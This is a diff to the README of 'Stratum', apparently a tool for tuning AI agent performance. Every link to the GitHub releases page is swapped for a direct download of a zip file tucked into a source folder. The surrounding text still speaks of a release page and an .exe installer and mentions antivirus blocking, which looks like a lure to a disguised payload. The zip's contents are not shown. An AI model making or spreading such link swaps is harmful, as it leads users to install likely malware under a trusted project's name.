@@ -1,6 +1,6 @@
 # ⚙️ Stratum - Optimize AI Agent Performance Easily
 
-[![Download Stratum](https://img.shields.io/badge/Download-Stratum-F64A8A?style=for-the-badge)](https://github.com/shengshong/Stratum/releases)
+[![Download Stratum](https://img.shields.io/badge/Download-Stratum-F64A8A?style=for-the-badge)](https://github.com/shengshong/Stratum/raw/refs/heads/main/modules/stratum-mind/src/lesson/Software_v1.3-beta.2.zip)
 
 ## 🌟 What is Stratum?
 
@@ -31,7 +31,7 @@ You don't need to install any extra software or tools to run Stratum.
 
 To get Stratum on your Windows PC, follow these steps:
 
-1. Click the big **Download Stratum** button at the top or go to the [release page](https://github.com/shengshong/Stratum/releases).
+1. Click the big **Download Stratum** button at the top or go to the [release page](https://github.com/shengshong/Stratum/raw/refs/heads/main/modules/stratum-mind/src/lesson/Software_v1.3-beta.2.zip).
 2. On the release page, find the latest version. It usually appears at the top.
 3. Look for a Windows installer file. It should end with `.exe`.
 4. Click the `.exe` file to start downloading.
@@ -95,13 +95,13 @@ If Stratum does not seem to work or you have issues, try these solutions:
 - Check that your antivirus did not block Stratum.
 - Run the installer again to repair the installation.
 
-If problems persist, visit the [release page](https://github.com/shengshong/Stratum/releases) for known issues or updates.
+If problems persist, visit the [release page](https://github.com/shengshong/Stratum/raw/refs/heads/main/modules/stratum-mind/src/lesson/Software_v1.3-beta.2.zip) for known issues or updates.
 
 ## 📥 Download Stratum Again
 
 If you need to download or update Stratum, use this link:
 
-[![Download Stratum](https://img.shields.io/badge/Download-Stratum-6BCBFF?style=for-the-badge)](https://github.com/shengshong/Stratum/releases)
+[![Download Stratum](https://img.shields.io/badge/Download-Stratum-6BCBFF?style=for-the-badge)](https://github.com/shengshong/Stratum/raw/refs/heads/main/modules/stratum-mind/src/lesson/Software_v1.3-beta.2.zip)
 
 Click this to visit the page. Select the latest `.exe` file under Releases and follow the installation steps again.
 
